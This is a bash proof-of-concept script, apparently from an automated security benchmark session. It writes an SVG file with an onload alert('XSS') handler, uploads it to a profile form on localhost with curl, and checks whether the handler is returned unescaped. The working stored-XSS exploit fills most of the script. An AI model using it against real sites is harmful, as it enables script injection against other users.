#!/bin/bash
# POC: Demonstrates Stored XSS via SVG file upload with onload event handler execution
# Target: ./repo
# Created: 2025-11-07T21:58:15.457Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# Stored XSS via SVG File Upload with Event Handlers POC
# This script demonstrates how an attacker can upload a malicious SVG file
# containing JavaScript in event handlers that will execute when rendered

TARGET="${1:-http://localhost:3000}"
TEMP_DIR="/tmp/xss_poc_$$"
mkdir -p "$TEMP_DIR"

echo "[*] Stored XSS via SVG Event Handlers POC"
echo "[*] Target: $TARGET"
echo ""

# Create malicious SVG file with onload event handler
SVG_FILE="$TEMP_DIR/xss.svg"
cat > "$SVG_FILE" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg onload="alert('XSS')" xmlns="http://www.w3.org/2000/svg">
  <text>Test</text>
</svg>
EOF

echo "[*] Created malicious SVG file with onload event handler"
echo "[*] File: $SVG_FILE"
echo ""

# Upload the SVG file
echo "[*] Uploading SVG file to profile..."
RESPONSE=$(curl -s -X POST "$TARGET/" \
  -F "name=Test" \
  -F "surname=User" \
  -F "address=Addr" \
  -F "image=@$SVG_FILE")

echo "[*] Server Response:"
echo ""
echo "$RESPONSE"
echo ""

# Check if the SVG content is in the response and if event handlers are NOT escaped
if echo "$RESPONSE" | grep -q 'onload="alert'; then
    echo "[+] VULNERABLE: SVG event handler found unescaped in response!"
    echo "[+] The onload attribute is not HTML-escaped or sanitized"
    echo "[+] XSS payload will execute when page is rendered in browser"
    
    # Extract the SVG portion to show the vulnerability
    SVG_CONTENT=$(echo "$RESPONSE" | grep -oP '<svg[^>]*onload[^>]*>.*?</svg>' || echo "")
    if [ -n "$SVG_CONTENT" ]; then
        echo ""
        echo "[+] Vulnerable SVG in response:"
        echo "$SVG_CONTENT"
    fi
    
    CLEANUP_EXIT=0
else
    echo "[-] SVG content not found or event handler was escaped/sanitized"
    echo "[-] Testing if SVG is present at all..."
    
    if echo "$RESPONSE" | grep -q '<svg'; then
        echo "[*] SVG element found - checking for sanitization:"
        SVG_CONTENT=$(echo "$RESPONSE" | grep -oP '<svg[^>]*>.*?</svg>' || echo "")
        if [ -n "$SVG_CONTENT" ]; then
            echo "$SVG_CONTENT" | head -c 200
            echo ""
            if echo "$SVG_CONTENT" | grep -q 'onload'; then
                echo "[+] Event handler present - checking if it's HTML-encoded..."
                if echo "$SVG_CONTENT" | grep -q '&quot;' || echo "$SVG_CONTENT" | grep -q '&#'; then
                    echo "[-] Event handler is HTML-encoded (sanitized)"
                    CLEANUP_EXIT=1
                else
                    echo "[+] Event handler found but not properly visible - VULNERABLE"
                    CLEANUP_EXIT=0
                fi
            else
                echo "[-] No event handlers found - appears sanitized"
                CLEANUP_EXIT=1
            fi
        fi
    else
        echo "[-] No SVG element found in response"
        CLEANUP_EXIT=1
    fi
fi

# Cleanup
rm -rf "$TEMP_DIR"

echo ""
echo "[*] POC Complete"
exit $CLEANUP_EXIT